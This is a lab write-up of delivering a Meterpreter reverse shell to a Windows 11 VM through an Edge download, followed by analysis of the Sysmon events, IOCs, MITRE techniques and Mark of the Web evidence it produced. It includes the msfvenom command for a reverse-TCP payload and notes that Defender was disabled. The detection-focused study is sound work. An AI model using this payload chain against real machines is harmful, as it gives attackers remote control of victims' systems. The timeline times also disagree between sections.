# Day 4 — Round 1: Browser-Delivered Meterpreter Reverse Shell

## Objective

Create a Meterpreter reverse shell payload on Kali, deliver it to the Windows 11 victim via browser download, and observe which events are triggered in Sysmon.

## Environment

| Role | Host | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.65.3 |
| Victim | Windows 11 | 192.168.65.4 |

Windows Defender was disabled prior to payload execution. Throughout the lab, Defender automatically re-enabled itself, terminating the session.

## Attack Chain

1. **Payload generation (Kali):**
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o evil.exe
   ```
2. **Payload hosted on Kali HTTP server, port 8080**
3. **Listener started on Kali, port 4444**
4. **Windows 11 victim downloaded `evil.exe` via Microsoft Edge browser**
5. **User executed `evil.exe`** — reverse shell established back to Kali
6. **Defender re-enabled automatically** — session terminated

## Sysmon Event IDs Triggered

| Event ID | Meaning | Observed Behavior |
|---|---|---|
| 22 | DNS query | `evil.exe` resolving a hostname |
| 11 | File created | `evil.exe` written to disk on download |
| 15 | File stream created | Alternate data stream — **Mark of the Web** (ZoneId=3) |
| 12 | Registry object created | Meterpreter touching the registry |
| 13 | Registry value set | Meterpreter modifying registry values |
| 1 | Process created | `evil.exe` executing |
| 3 | Network connection | Reverse shell calling back to Kali on port 4444 |
| 2 | File creation time changed | **Timestomping** — attacker manipulating timestamps |
| 5 | Process terminated | Defender killed the process |

## Behavioral Indicators of Compromise

What caused immediate suspicion in the telemetry:

- **No `FileVersion`, `Description`, `Product`, or `Company` metadata** — unsigned binary with no provenance
- Executed under context `WIN-KPHDAL23K4O\<user>` with **High integrity level**
- **`msedge.exe` spawned `evil.exe`** — a browser spawning an executable is an anomalous parent-child relationship and a high-confidence indicator of malicious activity

## MITRE ATT&CK Mapping

| Technique | Description |
|---|---|
| T1204.002 | User Execution: Malicious File |
| T1071.001 | Application Layer Protocol: Web Protocols (HTTP delivery on port 8080) |
| T1562.001 | Impair Defenses: Disable or Modify Tools (Defender disabled) |
| T1070.006 | Indicator Removal: Timestomp (Event ID 2) |

## Indicators of Compromise

| IOC Type | Value |
|---|---|
| Malicious file | `evil.exe` |
| MD5 | `82FC735C28439C7A4F694AFA793079B8` |
| SHA-256 | `1C80E26DD48F1B1CA4A849D5E6336245431F44B4FA4FE4583BBE37D09D48EB86` |
| C2 IP | `192.168.65.3` |
| C2 Port | `4444` |
| Delivery Port | `8080` |

## Mark of the Web (Forensic Detail)

At **22:07:26** Event ID 15 confirmed `msedge.exe` created a file stream — the entry confirming the file came through the browser. The hidden metadata stream attached to the file showed `Zone.Identifier` with `ZoneId=3`, meaning Windows tagged the file as downloaded from the internet and would have warned the user before execution.

## Forensic Timeline

| Time | Event | Detail |
|---|---|---|
| 02:07:26 | Edge downloads `evil.exe` | MotW `ZoneId=3` applied (Event ID 15) |
| 02:07:33 | `evil.exe` executed | Spawned by `msedge.exe` (Event ID 1) |
| 02:07:33 | Reverse connection established | To `192.168.65.3:4444` (Event ID 3) |
| 02:07:45 | Windows AppCompat logs execution | Event ID 13 |
| 02:07:XX | Defender terminates process | Event ID 5 |

## Confidence Assessment

**High.** If Defender had not detected the payload, the attacker would have gained privileged access on the Windows 11 host with potential for lateral movement.
